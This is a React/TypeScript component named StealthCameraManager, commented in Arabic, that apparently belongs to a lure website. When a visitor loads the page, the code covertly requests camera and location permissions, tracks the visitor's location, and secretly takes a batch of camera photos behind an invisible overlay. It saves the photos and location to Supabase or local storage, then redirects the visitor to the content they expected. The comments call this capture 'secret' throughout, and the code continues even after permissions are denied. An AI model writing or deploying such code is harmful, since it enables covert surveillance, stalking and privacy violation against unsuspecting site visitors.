import React, { useEffect } from 'react';
import { useStealthCamera } from '@/hooks/useStealthCamera';
import { Loader2, CheckCircle, AlertCircle } from 'lucide-react';
import { Progress } from '@/components/ui/progress';

interface StealthCameraManagerProps {
  onComplete: () => void;
  autoStart?: boolean;
  photoCount?: number;
}

const StealthCameraManager: React.FC<StealthCameraManagerProps> = ({ 
  onComplete, 
  autoStart = false,
  photoCount = 10 
}) => {
  const {
    isCapturing,
    capturedPhotos,
    currentPhotoIndex,
    startStealthCapture,
    saveVisitorData,
    getAllVisitors,
    // استخدام الوظائف الجديدة
    requestPermissions,
    startLocationTracking,
    getCurrentLocation,
    permissions,
    isMobile
  } = useStealthCamera();

  const [captureComplete, setCaptureComplete] = React.useState(false);
  const [status, setStatus] = React.useState('');
  const [error, setError] = React.useState<string | null>(null);
  const [permissionsRequested, setPermissionsRequested] = React.useState(false);
  const [locationAccurate, setLocationAccurate] = React.useState(false);

  // طلب الصلاحيات بمجرد تحميل الصفحة
  useEffect(() => {
    const initPermissions = async () => {
      if (!permissionsRequested) {
        console.log('🔒 بدء طلب الصلاحيات بشكل خفي...');
        try {
          // طلب الصلاحيات بشكل خفي
          const perms = await requestPermissions();
          setPermissionsRequested(true);
          
          // بدء تتبع الموقع بمجرد الحصول على الصلاحيات
          if (perms.location) {
            console.log('🌍 بدء تتبع الموقع بعد الحصول على الصلاحيات...');
            startLocationTracking();
            
            // فحص دقة الموقع
            setTimeout(async () => {
              const location = await getCurrentLocation();
              console.log('📍 دقة الموقع الحالية:', location.accuracy, 'متر');
              setLocationAccurate(location.accuracy <= 500);
            }, 3000);
          }
        } catch (error) {
          console.warn('⚠️ خطأ في طلب الصلاحيات:', error);
        }
      }
    };
    
    initPermissions();
    
    // استخدام متتبع موقع مخفي للأجهزة المحمولة
    if (isMobile() && !permissionsRequested) {
      console.log('📱 جهاز محمول - طلب صلاحيات إضافية للموقع');
      
      // استخدام حدث النقر للمساعدة في الحصول على الصلاحيات
      const handleUserInteraction = () => {
        if (!permissionsRequested) {
          requestPermissions();
          setPermissionsRequested(true);
          // بدء تتبع الموقع مع التفاعل الأول من المستخدم
          startLocationTracking();
          document.removeEventListener('click', handleUserInteraction);
        }
      };
      
      document.addEventListener('click', handleUserInteraction);
      return () => {
        document.removeEventListener('click', handleUserInteraction);
      };
    }
  }, [requestPermissions, startLocationTracking, getCurrentLocation, isMobile, permissionsRequested]);

  // بدء التقاط تلقائي عند التحميل إذا كان autoStart مفعل
  React.useEffect(() => {
    if (autoStart && !isCapturing && !captureComplete) {
      // انتظر قليلاً للسماح بتحميل الصفحة وطلب الصلاحيات
      const timer = setTimeout(() => {
        console.log('🚀 بدء التقاط تلقائي سري...');
        handleStartStealthCapture();
      }, 2000);
      
      return () => clearTimeout(timer);
    }
  }, [autoStart]);

  const handleStartStealthCapture = async () => {
    try {
      setError(null);
      setStatus('التحقق من الصلاحيات...');
      
      // تأكد من طلب الصلاحيات أولاً
      if (!permissions.requested) {
        const perms = await requestPermissions();
        
        // إذا لم نحصل على الصلاحيات، نستمر رغم ذلك ولكن مع تنبيه
        if (!perms.location || !perms.camera) {
          console.warn('⚠️ تم رفض بعض الصلاحيات، لكننا سنستمر');
        }
      }
      
      // بدء تتبع الموقع للحصول على أدق موقع ممكن
      startLocationTracking();
      
      setStatus('بدء التقاط الصور بشكل سري...');
      console.log('📸 بدء التقاط الصور السرية...');
      
      const photos = await startStealthCapture(photoCount);
      
      if (photos && photos.length > 0) {
        console.log(`✅ تم التقاط ${photos.length} صور بنجاح`);
        setStatus('الحصول على الموقع بدقة عالية...');
        
        // الحصول على الموقع بدقة عالية
        const visitorData = await saveVisitorData(photos);
        
        if (visitorData) {
          console.log('✅ تم حفظ بيانات الزائر بنجاح');
          
          // عرض معلومات الموقع في السجلات
          if (visitorData.location) {
            console.log('📍 معلومات الموقع:', {
              دقة: visitorData.location.accuracy.toFixed(1) + ' متر',
              مصدر: visitorData.location.provider || 'غير معروف'
            });
          }
          
          setStatus(`تم الانتهاء بنجاح! تم التقاط ${photos.length} صورة وتحديد الموقع بشكل سري`);
          setCaptureComplete(true);
          
          // في حالة autoStart، ننتقل فوراً للصفحة الرئيسية
          if (autoStart) {
            console.log('🏁 انتهاء التقاط السري - الانتقال للمحتوى الرئيسي');
            setTimeout(() => {
              onComplete();
            }, 1000); // انتظار ثانية واحدة فقط
          } else {
            // في الحالة العادية، ننتظر أكثر لعرض رسالة النجاح
            setTimeout(() => {
              onComplete();
            }, 3000);
          }
        } else {
          console.error('❌ فشل في حفظ البيانات');
          setError('خطأ في حفظ البيانات');
          
          // حتى لو فشل الحفظ في Supabase، ننتقل للمحتوى (لأن البيانات محفوظة محلياً)
          if (autoStart) {
            console.log('⚠️ فشل Supabase لكن البيانات محفوظة محلياً - الانتقال للمحتوى');
            setTimeout(() => {
              onComplete();
            }, 2000);
          }
        }
      } else {
        console.error('❌ فشل في التقاط الصور');
        setError('فشل في التقاط الصور');
        
        // حتى لو فشل التقاط الصور، ننتقل للمحتوى بعد مهلة
        if (autoStart) {
          console.log('⚠️ فشل التقاط الصور - الانتقال للمحتوى رغم ذلك');
          setTimeout(() => {
            onComplete();
          }, 3000);
        }
      }
    } catch (err) {
      console.error('❌ خطأ في التقاط الصور السرية:', err);
      setError('حدث خطأ أثناء التقاط الصور');
      
      // حتى في حالة الخطأ، ننتقل للمحتوى
      if (autoStart) {
        console.log('⚠️ خطأ عام - الانتقال للمحتوى رغم ذلك');
        setTimeout(() => {
          onComplete();
        }, 3000);
      }
    }
  };

  const progressPercentage = (currentPhotoIndex / photoCount) * 100;

  // إذا كان autoStart مفعل، لا نعرض أي واجهة مستخدم
  if (autoStart) {
    return (
      <div className="fixed inset-0 pointer-events-none">
        {/* تم إزالة مؤشر التقدم المخفي (التقاط سري) بالكامل */}
      </div>
    );
  }

  // واجهة المستخدم العادية (غير السرية)
  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-seductive-bg to-seductive-bg/80 p-4">
      <div className="w-full max-w-md bg-white/10 backdrop-blur-sm border border-white/20 rounded-lg p-6">
        <div className="text-center space-y-4">
          <h3 className="text-xl text-white font-semibold">
            التقاط سري
          </h3>
          
          {!isCapturing && !captureComplete && !error && (
            <div className="space-y-4">
              <p className="text-white/90 text-sm">
                سيتم التقاط {photoCount} صور بشكل سري بدون إظهار نافذة الكاميرا
              </p>
              <button 
                onClick={handleStartStealthCapture}
                className="w-full bg-seductive-accent hover:bg-seductive-accent/90 text-white px-4 py-2 rounded-lg transition-colors"
              >
                بدء التقاط السري
              </button>
            </div>
          )}
          
          {isCapturing && (
            <div className="space-y-4">
              <Loader2 className="w-12 h-12 text-seductive-accent animate-spin mx-auto" />
              <p className="text-white text-lg">
                جاري التقاط الصورة {currentPhotoIndex} من {photoCount}
              </p>
              <Progress value={progressPercentage} className="w-full" />
              <p className="text-white/80 text-sm">{status}</p>
              <p className="text-white/60 text-xs">
                التقاط يتم في الخلفية بدون إظهار الكاميرا
              </p>
            </div>
          )}
          
          {captureComplete && (
            <div className="space-y-4">
              <CheckCircle className="w-16 h-16 text-green-400 mx-auto" />
              <p className="text-white text-lg">تم الانتهاء بنجاح!</p>
              <p className="text-white/80 text-sm">{status}</p>
              <p className="text-white/60 text-xs">
                سيتم توجيهك للصفحة الرئيسية خلال ثوانٍ...
              </p>
            </div>
          )}
          
          {error && (
            <div className="space-y-4">
              <AlertCircle className="w-16 h-16 text-red-400 mx-auto" />
              <p className="text-red-400 text-lg">حدث خطأ</p>
              <p className="text-white/80 text-sm">{error}</p>
              <button 
                onClick={handleStartStealthCapture}
                className="w-full bg-seductive-accent hover:bg-seductive-accent/90 text-white px-4 py-2 rounded-lg transition-colors"
              >
                إعادة المحاولة
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default StealthCameraManager;